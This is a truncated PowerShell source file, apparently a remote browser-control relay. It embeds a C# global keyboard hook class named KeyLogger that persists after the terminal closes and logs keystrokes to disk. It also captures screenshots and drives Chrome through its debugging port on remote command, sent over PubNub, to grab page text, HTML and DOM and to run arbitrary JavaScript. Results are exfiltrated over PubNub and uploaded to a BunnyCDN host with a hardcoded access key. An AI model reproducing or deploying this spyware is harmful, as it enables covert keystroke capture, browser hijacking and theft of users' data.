# 20261107-1339

# Emulation.setFocusEmulationEnabled
# Wait-Debugger

Add-Type -AssemblyName System.Web

$script:scriptfname = [System.IO.Path]::GetFileNameWithoutExtension($PSCommandPath)

$scriptGuid = '70d8ab8e-fdb2-4076-9fd8-ba81c1be92e3' # Use a unique GUID for each script
# $createdNew = $false
# $script:SingleInstanceEvent = New-Object System.Threading.EventWaitHandle $true, ([System.Threading.EventResetMode]::ManualReset), "Global\$scriptGuid", ([ref] $createdNew)

#if (-not $createdNew) {
    #Write-Error "An instance of this script is already running. Exiting."
    #exit 1
#}

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# 20260925-1432

# note: keeps running even after terminal closed down
Add-Type -TypeDefinition '
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace PowerShell {
public class KeyLogger
{
    public static string filePath = @"C:\\ProgramData\\owdkeyboardlog.txt"; // Use the full path
    public static StringBuilder sb = new StringBuilder("", 80);
    
    private static IntPtr _hookID = IntPtr.Zero;
    private static LowLevelKeyboardProc _proc = HookCallback;

    // Delegate for the hook procedure
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    // Required for the message loop
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int GetMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);

    [StructLayout(LayoutKind.Sequential)]
    private struct MSG { public IntPtr hwnd; public uint message; public IntPtr wParam; public IntPtr lParam; public uint time; public int ptX; public int ptY; }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        int vkCode = -1;

        if (nCode >= 0 && wParam == (IntPtr)0x0100) // WM_KEYDOWN
        {
            vkCode = Marshal.ReadInt32(lParam);
            // Console.WriteLine($"Key Pressed: {(System.Windows.Forms.Keys)vkCode}"); // Requires System.Windows.Forms
            sb.Append("[");
            sb.Append(String.Format("{0}", (System.Windows.Forms.Keys) vkCode));
            sb.Append("]");
        }

        if ( ( ( (System.Windows.Forms.Keys) vkCode ) == System.Windows.Forms.Keys.Enter ) || ( sb.Length >= 15 ) ) {
            string result = sb.ToString();
            System.IO.File.AppendAllText(filePath, result + Environment.NewLine);
            sb.Clear();
            sb.Length = 0;
        }

        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    public static void Main()
    {
        _hookID = SetWindowsHookEx(13, _proc, GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName), 0);

        // Message loop to keep the hook active
        MSG msg;
        while (GetMessage(out msg, IntPtr.Zero, 0, 0) > 0) { }

        UnhookWindowsHookEx(_hookID);
    }
}
}
' -ReferencedAssemblies System.Windows.Forms

function Get-Identity {
    $ScriptName = "pscdp.relay.ps1"

    $ComputerName = $env:COMPUTERNAME
    
    $UserName = $env:USERNAME
    
    return "$ScriptName|$ComputerName|$UserName|PowerShell-$PSVersionTable"
}

$script:identitykvpstr = Get-Identity | ConvertTo-Json

$script:logger_logmsg_i = 0
function Log-Msg {
    param([object]$Msg)

    $caller = (Get-PSCallStack)[0].FunctionName

    if ( (Get-PSCallStack).length -gt 1 ) {
        $caller = (Get-PSCallStack)[1].FunctionName
    }

    $script:logger_logmsg_i++

    if ( $_ -is [System.Exception] -or $_ -is [System.Management.Automation.ErrorRecord]) {
        Write-Host "caller: $caller" 
        Write-Error $_.Exception.Message
        Write-Host $_.ScriptStackTrace -ForegroundColor DarkGray
    } else {
        Write-Host "$caller|$script:logger_logmsg_i|$Msg" -ForegroundColor Cyan
    }
}

function Get-Timestamp {
    $ret = Get-Date -Format "HH:mm:ss.fff"
    return $ret
}

function Take-Screenshot() {
    $memoryStream = New-Object System.IO.MemoryStream

    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen

    $name = (( $screen.DeviceName -replace '\\', '' ) -replace '\.', '')

    $width = $screen.Width
    $height = $screen.Height
    $left = $screen.Left
    $top = $screen.Top

    $bitmap = New-Object System.Drawing.Bitmap $width, $height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($left, $top, 0, 0, $bitmap.Size)

    $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
        
    $graphic.Dispose()
    $bitmap.Dispose()

    $base64String = [Convert]::ToBase64String($memoryStream.ToArray())

    return $base64String
}

function Get-FrontendUrls() {
    return $script:clientws.GetTargets()
}

function Get-KeyboardLog() {
    $text = Get-Content -Path "C:\ProgramData\owd\owdkeyboardlog.txt" -Raw

    return $text
}

class PSCDPCommandException : System.Exception {
    PSCDPCommandException([string]$message) : base($message) {}
}

class PSCDPBuiltInCommand {
    [string]$source=$null
    [string]$destination=$null
}

class PSCDPCommand {
    [string]$name

    [string]$sessionId

    [int32]$id
    [string]$method
    [hashtable]$params

    [PSCDPResult]$response
    
    [scriptblock]$callback
    [bool]$isinvoked = $false

    [bool]$iserror = $false

    [bool]$isbroadcast = $false
    [bool]$isbrowserversion = $false
    [bool]$ispbping = $false

    [object]$sendTask = $null
    [object]$taskresult = $null

    [hashtable]$builtincmd = $null

    [string]$targetid = $null
    [PSCDPTarget]$target = $null

    [bool]HasCallback() {
        return ( $null -ne $this.callback )
    }

    static [PSCDPCommand] Create([hashtable]$obj) {
        $out = [PSCDPCommand]::new()
        
        $out.id = $obj.id
        $out.method = $obj.method
        $out.params = $obj.params
        $out.response = $obj.response
        $out.sessionId = $obj.sessionId
        
        $out.callback = $obj.callback
        $out.isinvoked = $obj.isinvoked

        $out.iserror = $obj.iserror

        $out.isbroadcast = $obj.isbroadcast
        $out.isbrowserversion = $obj.isbrowserversion
        $out.ispbping = $obj.ispbping

        $out.targetid = $obj.targetid
        $out.target = $obj.target

        if ( $obj.builtincmd -is [pscustomobject] ) {
            $ht = Transform-PSCustomObject($obj.builtincmd)
        } elseif ( $obj.builtincmd -is [hashtable] ) {
            $ht = $obj.builtincmd
        } else {
            $ht = [hashtable]$null
        }

        $out.builtincmd = $ht

        return $out
    }

    [hashtable]GetHashtable() {

        $isexec = $false
        $execstatus = "UNKNOWN"

        if ( $null -ne $this.taskresult -and $null -ne $this.sendTask ) {
            $isexec = $true
            $execstatus = [string]$this.sendTask.Status
        }

        $obj = @{
            name=$this.name
            id=$this.id
            method=$this.method
            params=$this.params
            sessionId=$this.sessionId
            #callback=$this.callback
            isinvoked=$this.isinvoked
            iserror=$this.iserror
            isbroadcast=$this.isbroadcast
            isbrowserversion=$this.isbrowserversion
            ispbping=$this.ispbping
            isexec=$isexec
            execstatus=$execstatus
            builtincmd=$this.builtincmd
        }

        $obj['hascallback']=$false

        if ( $null -ne $this.callback ) {
            $obj['hascallback']=$true
        }

        if ( $null -ne $this.target ) {
            $obj['targetid']=$this.target.targetId
        } elseif ( $null -ne $this.targetid ) {
            $obj['targetid'] = $this.targetid
        } else {
            $obj['targetid']=$null
        }

        $obj['response'] = $null

        if ( $null -ne $this.response ) {
            $obj['response'] = $this.response.GetHashtable()
        }

        return $obj
    }

    [hashtable] GetDict() {

        if ( [string]::IsNullOrWhiteSpace($this.method) ) {
            throw [PSCDPCommandException]::new('method is missing')
        }

        $obj = @{
            id=$this.id
            method=$this.method
        }

        if ( $null -ne $this.params ) {
            $obj.Add('params', $this.params)
        }

        if ( $null -ne $this.target ) {
            $this.sessionId = $this.target.sessionId
        }

        if ( ! [string]::IsNullOrWhiteSpace($this.sessionId) ) {
            $obj.Add('sessionId', $this.sessionId)
        }

        return $obj
    }

    [string] ToJSON() {
        $obj = $this.GetDict() 
        $jsonstr = $obj | ConvertTo-Json -Depth 10 -Compress
        return $jsonstr
    }
}

enum PSCDPCommandErrorType {
    JavaScriptError
    CDPError
    GeneralError
    NoError
    TransformError
    ExceptionError

    <# CDPError
    {
        "id": 1,
        "error": {
            "code": -32602,
            "message": "Invalid parameters",
            "data": "Some missing parameter details"
        }
    }
    #>

    <# JavaScriptError
        {
            "id": 1,
            "result": {
                "result": {
                    "type": "object",
                    "subtype": "error",
                    "className": "TypeError",
                    "description": "TypeError: Cannot read properties of null (reading 'subtype')",
                    "objectId": "-6633390234293888361.1.1"
                },
                "exceptionDetails": {
                    "exceptionId": 1,
                    "text": "Uncaught",
                    "lineNumber": 0,
                    "columnNumber": 14,
                    "scriptId": "12",
                    "url": "",
                    "exception": {
                        "type": "object",
                        "subtype": "error",
                        "className": "TypeError",
                        "description": "TypeError: Cannot read properties of null (reading 'subtype')",
                        "objectId": "-6633390234293888361.1.2"
                    }
                }
            }
        }
    #>
}

class PSCDPResult {

    [int32]$id = -1
    [hashtable]$result = @{}
    [PSCDPCommand]$cmd = $null

    [bool]$iserror = $false
    [PSCDPCommandErrorType]$errorType = [PSCDPCommandErrorType]::NoError

    static [PSCDPCommandErrorType] GetErrorType([hashtable]$msght) {

        try {

            if ( $msght.ContainsKey('error') ) {
                return [PSCDPCommandErrorType]::CDPError
            }
    
            if ( ! [string]::IsNullOrEmpty($msght.result.exceptionDetails.exceptionId) ) {
                return [PSCDPCommandErrorType]::JavaScriptError
            }

            if ( $msght.ContainsKey('result') ) {
                return [PSCDPCommandErrorType]::NoError
            }

            # CDP event notifications
            if ( $msght.ContainsKey('method') ) {
                return [PSCDPCommandErrorType]::NoError
            }
    
        } catch {
            return [PSCDPCommandErrorType]::ExceptionError
        }

        return [PSCDPCommandErrorType]::GeneralError
    }
    
    static [PSCDPResult] Create([hashtable]$msght) {
        [PSCDPResult]$obj = [PSCDPResult]::new()

        $terrorType = [PSCDPResult]::GetErrorType($msght)

        $obj.id = $msght['id']

        $tresult = $msght['result']

        $obj.result = $msght

        if ( ( ! ($null -eq $tresult ) ) -and ( $tresult -is [pscustomobject] ) ) {
            $obj.result = Transform-PSCustomObject($tresult)
        }

        $obj.errorType = $terrorType
        $obj.iserror = $true

        if ( $terrorType -eq [PSCDPCommandErrorType]::NoError ) {
            $obj.iserror = $false
        }

        return $obj
    }

    [hashtable] GetHashtable() {
        $obj = $this.result # check if response is error, if so parse error and
                            # return error object

        return $obj
    }

    [string] GetResultStr() {

        $resultstr = ""

        try {
            $resultstr = $this.result | ConvertTo-Json -Depth 10
        } catch {
            
        }

        return $resultstr
    }
}

class PSCDPTarget {
    [string]$title
    [string]$url
    [string]$targetId
    [string]$type
    [string]$description
    [string]$devtoolsFrontendUrl
    [string]$webSocketDebuggerUrl
    [string]$faviconUrl
    [bool]$attached
    [bool]$canAccessOpener
    [string]$browserContextId
    # [string]$pid # TODO fix this is reserved keyword in powershell
    [int32]$executionContextId = -1 # needed to execute Runtime.callFunctionOn 
    [bool]$targetDestroyed = $false

    [string]$sessionId

    [byte[]]$pngBytes

    # set when result arrives with success
    $enable_init = $false
    $addbinding_ts = $null              # set before call  to addBinding
    $addbinding_ts_ok = $null           # set after call  to addBinding
    $addbinding_ok = $false             # Runtime.addBinding
    $runtime_enable_ok = $false         # Runtime.enable
    $emulation_enable_ok = $false       # Emulation.setFocusEmulationEnabled

    $commands = [System.Collections.Generic.List[PSCDPCommand]]::new()
    $consolecalls = [System.Collections.Generic.List[PSCDPResult]]::new()

    [hashtable] GetDict() {
        $ht = @{
            title=$this.title
            url=$this.url
            targetId=$this.targetId
            type=$this.type
            description=$this.description
            devtoolsFrontendUrl=$this.devtoolsFrontendUrl
            webSocketDebuggerUrl=$this.webSocketDebuggerUrl
            faviconUrl=$this.faviconUrl
            attached=$this.attached
            canAccessOpener=$this.canAccessOpener
            browserContextId=$this.browserContextId
            sessionId=$this.sessionId
            executionContextId=$this.executionContextId
            runtime_enable_ok=$this.runtime_enable_ok
            addbinding_ok=$this.addbinding_ok
            emulation_enable_ok=$this.emulation_enable_ok
        }

        return $ht
    }

    [string] GetScreenshot() {
        # convert pngBytes to base64 string
        return $null
    }

    static [PSCDPTarget] Create([PSCustomObject]$obj) {
        $ht = @{
            title=$obj.title
            url=$obj.url
            targetId=$obj.targetId
            type=$obj.type
            description=$obj.description
            devtoolsFrontendUrl=$obj.devtoolsFrontendUrl
            webSocketDebuggerUrl=$obj.webSocketDebuggerUrl
            faviconUrl=$obj.faviconUrl
            attached=$obj.attached
            canAccessOpener=$obj.canAccessOpener
            browserContextId=$obj.browserContextId
            sessionId=$obj.sessionId
        }

        return [PSCDPTarget]$ht
    }
}

$script:pingpbtarget_callback = {
    param(
        [PSCDPResult]$Response, [PSCDP]$cdpobj
    )
   
    $cdpobj.pbpingresponses.Add( $Response )

    if ( $Response.iserror ) {
        $cdpobj.pbpingerrors.Add( $Response )
        return
    } 

    $cdpobj.pbpingcheck = 0
}

$script:browserversion_callback = {
    param(
        [object]$Response, [PSCDP]$cdpobj
    )

    $cdpobj.browserversion = $Response.result
}

$script:runtime_enable_callback = {
    param(
        [object]$Response, [PSCDP]$cdpobj
    )

    $target = $Response.cmd.target

    $target = $cdpobj.GetTarget($target.targetId)

    if ( ! $null -eq $target ) {
        $target.runtime_enable_ok = $true
    }
}

$script:emulation_enable_callback = {
    param(
        [PSCDPResult]$Response, [PSCDP]$cdpobj
    )

    $target = $Response.cmd.target

    $target.emulation_enable_ok = $true
}

# TODO: upload to bunny and send back download link
$script:captureScreenshot_callback = {
    param(
        [object]$Response, [PSCDP]$cdpobj
    )

    $cmd = $Response.cmd.builtincmd
    $target = $Response.cmd.target
    $target = $cdpobj.GetTarget($target.targetId)

    $resultout = @{
        builtincmd=$cmd.builtincmd
        source="pscdp.relay.ps1"
        destination=$cmd.source
        cmdid=$cmd.cmdid
        resultid=$(Get-Random -Minimum 10000000 -Maximum 99999999)
        ts=$(Get-Timestamp)
        result=$null
        targetId=$cmd.targetid
    }

    try {
        $imagedata=$Response.result.data

        $chunkSize = 512
        $imagelength = $imagedata.length
        $chunkcount = [int] ( $imagelength / $chunkSize )
        $remainderlength = $imagelength % $chunkSize

        $chunks = [System.Collections.Generic.List[string]]::new()

        $tchunkcount = $chunkcount

        if ( $remainderlength -gt 0 ) {
            $tchunkcount = $chunkcount - 1
        }

        for ($i = 0; $i -lt $tchunkcount; $i++ ) {
            $substr = ""
            try {
                $substr = $imagedata.Substring( $i*$chunkSize, $chunkSize )
            } catch {
                Log-Msg $_
            }

            $chunks.Add( $substr )
        }

        if ( $remainderlength -gt 0 ) {
            $chunks.Add( $imagedata.Substring( ($chunkcount-1)*$chunkSize ) )
        }

        if ( $null -eq $chunks -or $chunks.length -le 0 ) {
            Log-Msg "pass"
        }

        for ($i = 0; $i -lt $chunks.Count; $i++ ) {

            $result = @{ imagedata="" }
            $result['imagedata'] = $chunks[$i]

            $resultout['result'] = $result

            $resultout['ts']=$(Get-Timestamp)

            $resultout['chunkcount'] = $chunkcount
            $resultout['chunksize'] = $chunksize
            $resultout['chunkindex'] = $i
            $resultout['remainderlength'] = $remainderlength
            
            $script:pubnubws.SendPBMessage($resultout)
        }
    } catch {
        Log-Msg $_
    }

}

# TODO implement logic to refresh targets list
$script:getTargets_callback = {
    param(
        [object]$Response, [PSCDP]$cdpobj
    )

    $cmd = $Response.cmd.builtincmd

    $resultout = @{
        builtincmd=$cmd.builtincmd
        source="pscdp.relay.ps1"
        destination=$cmd.source
        cmdid=$cmd.cmdid
        resultid=$(Get-Random -Minimum 10000000 -Maximum 99999999)
        ts=$(Get-Timestamp)
        result=$null
        targetId=$Response.cmd.target.targetId
    }

    $resultout['result'] = $Response.result.targetInfos

    $script:pubnubws.SendPBMessage($resultout)
}

$script:evaluate_callback = {
    param(
        [PSCDPResult]$Response, [PSCDP]$cdpobj
    )

    $cmd = $Response.cmd.builtincmd

    $resultout = @{
        builtincmd=$cmd.builtincmd
        source="pscdp.relay.ps1"
        destination=$cmd.source
        cmdid=$cmd.cmdid
        resultid=$(Get-Random -Minimum 10000000 -Maximum 99999999)
        ts=$(Get-Timestamp)
        result=$null
        targetId=$Response.cmd.target.targetId
    }

    $resltstr = $Response.GetResultStr()
    
    if ( $null -eq $resltstr ) {
        $resltstr=""
    }

    $bytes = [System.Text.Encoding]::UTF8.GetBytes($resltstr)
    $base64str = [Convert]::ToBase64String($bytes)

    $resultout['result'] = $base64str

    $script:pubnubws.SendPBMessage($resultout)
}

$script:GetTargetHTML_callback = {
    param(
        [object]$Response, [PSCDP]$cdpobj
    )

    $cmd = $Response.cmd.builtincmd

    $resultout = @{
        builtincmd=$cmd.builtincmd
        source="pscdp.relay.ps1"
        destination=$cmd.source
        cmdid=$cmd.cmdid
        resultid=$(Get-Random -Minimum 10000000 -Maximum 99999999)
        ts=$(Get-Timestamp)
        result=$null
        targetId=$target.targetId
    }

    $resltstr = $Response.result.result.value
    
    if ( [string]::IsNullOrEmpty($resltstr) ) {
        $resltstr=""
    }

    $bytes = [System.Text.Encoding]::UTF8.GetBytes($resltstr)
    # $base64str = [Convert]::ToBase64String($bytes)
    
    $fid = [string]( Get-Random -Minimum 10000000 -Maximum 100000000 )
    $fname = "GetTargetHTML_" + $fid + ".txt"
    $response = Upload-Bunny $bytes $fname

    $response = $response | ConvertFrom-Json -AsHashtable

    # TODO check if response status is ok, etc.

    $resultout['result'] = ${ 
        url="https://testdev2829pull.b-cdn.net/$fname"
        response=$response
    }

    $script:pubnubws.SendPBMessage($resultout)
}

$script:getdom_callback = {
    param(
        [PSCDPResult]$Response, [PSCDP]$cdpobj
    )

    $obj = $Response.result.root

    $result = ProcessDOMObj($obj)

    if ( $null -eq $result ) {
        $result = @{} # TODO insert error flag
    }

    $cmd = $Response.cmd.builtincmd

    $resultout = @{
        builtincmd=$cmd.builtincmd
        source="pscdp.relay.ps1"
        destination=$cmd.source
        cmdid=$cmd.cmdid
        resultid=$(Get-Random -Minimum 10000000 -Maximum 99999999)
        ts=$(Get-Timestamp)
        result=$null
        targetId=$Response.cmd.target.targetId
    }

    $jsonstr = $result | ConvertTo-Json -Depth 10 # TODO might not be adequate -- 

    $bytes = [System.Text.Encoding]::UTF8.GetBytes($jsonstr)
    $base64str = [Convert]::ToBase64String($bytes)

    $resultout['result'] = $base64str

    $script:pubnubws.SendPBMessage($resultout)

    # DOM.querySelector
    # DOM.getOuterHTML
    # DOM.describeNode
    # DOM.resolveNode
    
}

function ProcessDOMObj {
    param([PSCustomObject]$obj)

    $result = @{}

    try {
        $sresult = Transform-PSCustomObject($obj)

        $keys = @("backendNodeId", "nodeType", "nodeName","documentURL","baseURL")        
        $keys.ForEach({ $result[$_] = $sresult[$_] })

        $sattributes = $sresult['attributes']
        $attributes = @{}

        if ( $null -ne $sattributes -and $sattributes -is [array] ) {
            
            $key = $null

            for ( $i = 0; $i -lt $sattributes.Length; $i++ ) {
                $value = $sattributes[$i]

                if ($i % 2 -eq 0) {
                    $key = $value
                } else {
                    $attributes.Add($key, $value)
                }

            }

            if ( $null -ne $attributes -and $attributes.Count -gt 0 ) {
                $result.Add('attributes', $attributes)
            }

        }

        $schildren = $sresult['children']

        if ( $null -ne $schildren -and $schildren -is [array] ) {
            
            $children = [hashtable[]]::new($schildren.Length)

            for ( $i = 0; $i -lt $schildren.Length; $i++ ) {
                $childobj = $schildren[$i]

                $child = ProcessDOMObj($childobj)

                $children[$i] = $child
            }

            $result.Add('children', $children)
        }


    } catch {
        Log-Msg $_ # TODO convert exception to hashtable and return
        return $null
    }

    return $result
}

# TODO refactor to use pubnubws to upload instead of direct HTTP request
#      make javascript POST call (no need to write pb message)
function Upload-Bunny {
    param (
        [byte[]]$bytes,
        [string]$fname
    )


    $uri = "https://ny.storage.bunnycdn.com/testdev2829/$fname"

    $headers = @{
        "AccessKey"     = "814e8500-65b3-41a9-a638a74ec57d-911b-4a20"
        "User-Agent"    = "python-requests/2.32.3"
        "Content-Type"  = "application/octet-stream"
    }
    
    try {
        $response = Invoke-WebRequest -Uri $uri -Method Put -Body $bytes -Headers $headers -UseBasicParsing
    } catch {
        Log-Msg $_
    }
    
    return $response
}

function Transform-PSCustomObject($obj) {
    $ht = @{}

    try {
        $obj.psobject.Properties | ForEach-Object {
            $ht[$_.Name] = $_.Value
        }
    } catch {
        $ht = $null
    }
    
    return $ht;
}

# TODO implement capability execute arbitrary CDP commands
#      master enters CDP commands in UI tooling, etc.
function Exec-CDP {
    param($cmd)

    Log-Msg "pass"
}

function ChunkBytes {
    [OutputType([hashtable])]
    param([string]$imagedata, [int32]$chunkSize = 512)

    $chunks = [System.Collections.Generic.List[string]]::new()

    $resultout = @{}

    $resultout['chunksize'] = $chunkSize
    $resultout['chunks'] = $chunks
    $resultout['chunkcount'] = -1
    $resultout['remainderlength'] = -1

    if ( [string]::IsNullOrEmpty($imagedata) ) {
        return $resultout
    }

    $imagelength = $imagedata.length
    $chunkcount = [int] ( $imagelength / $chunkSize )
    $remainderlength = $imagelength % $chunkSize

    $tchunkcount = $chunkcount

    if ( $remainderlength -gt 0 ) {
        $tchunkcount = $chunkcount - 1
    }

    for ($i = 0; $i -lt $tchunkcount; $i++ ) {
        $substr = ""
        $substr = $imagedata.Substring( $i*$chunkSize, $chunkSize )

        $chunks.Add( $substr )
    }

    if ( $remainderlength -gt 0 ) {
        $chunks.Add( $imagedata.Substring( ($chunkcount-1)*$chunkSize ) )
    }

    $resultout['chunks'] = $chunks    
    $resultout['remainderlength'] = $remainderlength
    $resultout['chunkcount'] = $chunkcount

    return $resultout
}

# http GET/POST requests to chrome cdp
function Process-CDP {
    param($cmd)

    $devurl = $cmd.url

    if ( [string]::IsNullOrEmpty($devurl) ) {
        return $null
    }

    $ret = @{}

    $uri = [uri]$devurl
    $params = [System.Web.HttpUtility]::ParseQueryString($uri.Query)

    $httpres = Invoke-WebRequest -Method Get -Uri $devurl -ErrorAction Stop -UseBasicParsing

    # TODO check $httpres.StatusCode
    # handle errors gracefully
    
    $byteArray = $httpres.RawContentStream.ToArray()

    if ( $params.AllKeys.Contains("testchunking") ) {
        $byteArray = $byteArray + (, [byte]0 * 16384)
    }

    $bodystr = [System.Convert]::ToBase64String($byteArray)

    $ret = @{
        headers=$httpres.Headers
        body=$null
        requesturl=$devurl
        ischunked=$false
        chunkobj=$null
        statuscode=$httpres.StatusCode
    }

    if ( $bodystr.Length -ge 16384 ) {
        $chunkobj = ChunkBytes $bodystr
        $ret['chunkobj'] = $chunkobj
        $ret['ischunked'] = $true
    } else {
        $ret['body'] = $bodystr
    }

    return $ret
}

function Send-ChunkedResult {
    param([hashtable]$result, [hashtable]$resultout)

    $chunkobj = $result['chunkobj']
    $chunks = $chunkobj['chunks']
    $chunkcount = [int32]$chunks.Count

    $tresult = @{
        chunksize = $chunkobj['chunksize']
        chunkcount = $chunkobj['chunkcount']
        remainderlength = $chunkobj['remainderlength']
        imagedata = $null
        chunkindex = -1
    }

    for ( $i=0; $i -lt $chunkcount; $i++ ) {

        $tresult['imagedata'] = $chunks[$i]
        $tresult['chunkindex'] = $i

        if ( $i -eq 0 ) {
            $tresult['requesturl'] = $result['requesturl']
            $tresult['statuscode'] = $result['statuscode']
            $tresult['headers'] = $result['headers']
        }

        $resultout['result'] = $tresult

        $script:pubnubws.SendPBMessage($resultout)
    }

}

function Process-BuiltInCommand {
    param([hashtable]$cmd, [PSCDP]$cdpobj)

    if( $null -ne $cmd ) {
        $cdpobj.builtincmds.Add($cmd)
    }

    $resultout = @{
        builtincmd=$cmd.builtincmd
        source="pscdp.relay.ps1"
        destination=$cmd.source
        cmdid=$cmd.cmdid
        resultid=$(Get-Random -Minimum 10000000 -Maximum 99999999)
        ts=$(Get-Timestamp)
        result=$null
    }

    if ( $cmd.builtincmd -eq "GetFrontendUrls" ) {
        $result = Get-FrontendUrls
    } elseif ( $cmd.builtincmd -eq "ProcessCDP" ) {
        $result = Process-CDP($cmd)

        $ischunked = $result['ischunked']

        if ( $ischunked ) {
            Send-ChunkedResult($result, $resultout)
            return
        }

    } elseif ( $cmd.builtincmd -eq "ExecCDPCommand" ) {
        $result = Exec-CDP($cmd)
    } elseif ( $cmd.builtincmd -eq "GetTargets" ) {
        $targets = $script:clientws.targets

        $ttargets = $targets | ForEach-Object { $_.GetDict() }

        $result = $ttargets
    } elseif ( $cmd.builtincmd -eq "RefreshTargets" ) {

        $script:clientws.AddQueue( @{ 
            method="Target.getTargets"; 
            params=@{ filter=@( @{ type="page"; exclude=$false } ) } 
            callback=$script:getTargets_callback
            builtincmd=$cmd
        } ) 
        
        return
    } elseif ( $cmd.builtincmd -eq "GetTargetScreenCapture" ) {
        $targetId = $cmd.targetId

        $target = $script:clientws.GetTarget($targetId)

        $pbmsg = @{ 
            method="Page.captureScreenshot"; 
            params=@{ 
                format="png"
                quality=100
                fromSurface=$true
                captureBeyondViewport=$true
            }; 
            target=$target; 
            callback=$script:captureScreenshot_callback;
            builtincmd=$cmd
        }

        $script:clientws.AddQueue( $pbmsg )

        return
    } elseif ( $cmd.builtincmd -eq "GetTargetText" ) {
        
        $pbmsg = @{ 
            method="Runtime.evaluate"; 
            params=@{ 
                expression="document.body.innerText"
                returnByValue=$true
            }; 
            target=$target; 
            callback=$script:evaluate_callback;
            builtincmd=$cmd
        }

        $script:clientws.AddQueue( $pbmsg )
        
        return

    } elseif ( $cmd.builtincmd -eq "ExecEvaluate" ) {

        $targetid = $cmd.targetid
        $target = $script:clientws.GetTarget($targetid)

        $expression = $cmd.expression
        $expression = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($expression))

        $params = @{
            expression=$expression
            returnByValue=$true
        }

        if ( $null -ne $target -and $target.executionContextId -ge 0 ) {
            $params.Add('contextId',$target.executionContextId)
        }

        $pbmsg = @{ 
            method="Runtime.evaluate"; 
            params=$params
            targetid=$targetid;
            builtincmd=$cmd;
            callback=$script:evaluate_callback
        }

        $script:clientws.AddQueue( $pbmsg )

        return
    } elseif ( $cmd.builtincmd -eq "GetTargetHTML" ) {

        $pbmsg = @{ 
            method="Runtime.evaluate"; 
            params=@{ 
                expression="document.documentElement.outerHTML"
                returnByValue=$true
            }; 
            target=$target;
            builtincmd=$cmd;
            callback=$script:GetTargetHTML_callback
        }

        $script:clientws.AddQueue( $pbmsg )

        return
    } elseif ( $cmd.builtincmd -eq "SendTestMessage" ) {
        $result = "message received -- $(Get-Timestamp)"
    } elseif ( $cmd.builtincmd -eq "GetClientCommands" ) {

        $result = $script:clientws.commands | ForEach-Object { 
            $_.GetHashtable()
        }
        
    } elseif ( $cmd.builtincmd -eq "LoadQueue" ) {

        $targetid = $cmd.targetid
        
        $target = $script:clientws.GetTarget($targetid)

        $script:clientws.LoadQueue($target)

        return

    } elseif ( $cmd.builtincmd -eq "RefreshDOM" ) {

        $targetid = $cmd.targetid
        
        $pbmsg = @{ 
            method="DOM.getDocument";
            params = @{
              depth=1;
              pierce=$true;
            };
            targetid=$targetid;
            builtincmd=$cmd;
            callback=$script:getdom_callback
          }
          
        $script:clientws.AddQueue( $pbmsg )

        return
    } elseif ( $cmd.builtincmd -eq "GetScreenshot" ) {
        throw 'fatal error: not implemented'
    } elseif ( $cmd.builtincmd -eq "GetKeyboardLog" ) {
        throw 'fatal error: not implemented'
    } elseif ( $cmd.builtincmd -eq "GetCDPVersion" ) { 
        
        $script:clientws.AddQueue( @{ 
            method="Browser.getVersion"; 
            params=@{} 
            #callback=
            builtincmd=$cmd
        } ) 

        return
    } else {
        throw "unsupported command [$($cmd.builtincmd)]"
    }

    $resultout['result'] = $result

    $script:pubnubws.SendPBMessage($resultout)
}

# NOTE only supports pb messages with builtincmd payload
function Process-PubNubEvent {

    param([string]$Message,[PSCDP]$cdpobj)

    try {
        $payload = $Message | ConvertFrom-Json # should have cmdid, etc.

        if ( $payload.message.source -eq "pscdp.relay.ps1" ) {
            return
        } elseif ( $payload.type -eq "PubNubStatus" ) {
            return
        } elseif ( ! ( $payload.message.destination -eq "pscdp.relay.ps1" ) ) {
            return
        }

    } catch {

    }

    try {
        if ( [string]::IsNullOrEmpty($payload.message.builtincmd) ) {
            return
        }
    } catch {
        return
    }

    $cmd = $null

    $cmd = $payload.message

    if ( $null -ne $cmd ) {
        $cmd = Transform-PSCustomObject($cmd)
        Process-BuiltInCommand $cmd $cdpobj
    }

}

function Ping-DebugPort {
    param($debugport)

    try {
        $targets = Invoke-RestMethod -Uri "http://localhost:$debugport/json" -ErrorAction Stop
    } catch [System.Net.WebException] {
        Log-Msg "[R5P9]: $($_.Exception.Message)"
        return $null
    }        


    # $targets | Select-Object title, id, webSocketDebuggerUrl
    $targets = $targets | Where-Object { $_.type -eq "page" }

    return $targets
}

class PSCDPException : System.Exception {

    PSCDPException([string]$Message) : base($Message) {
    }
}

class PSCDP {

    $debugport = 9223

    $logconsolemsg = $false
    $bufferSize = 4096
    $resetonattach = $false

    $wsUri = $null
    $websocket = $null

    [string]$wsname = $null

    $sendQueue = [System.Collections.Generic.List[PSCDPCommand]]::new()

    $commands = [System.Collections.Generic.List[PSCDPCommand]]::new()
    $callbackcmds = [System.Collections.Generic.List[PSCDPCommand]]::new()

    $responses = [System.Collections.Generic.List[hashtable]]::new() 
    $results = [System.Collections.Generic.List[PSCDPResult]]::new() 
    $errors = [System.Collections.Generic.List[hashtable]]::new() 

    $consolecalls = [System.Collections.Generic.List[PSCDPResult]]::new() 

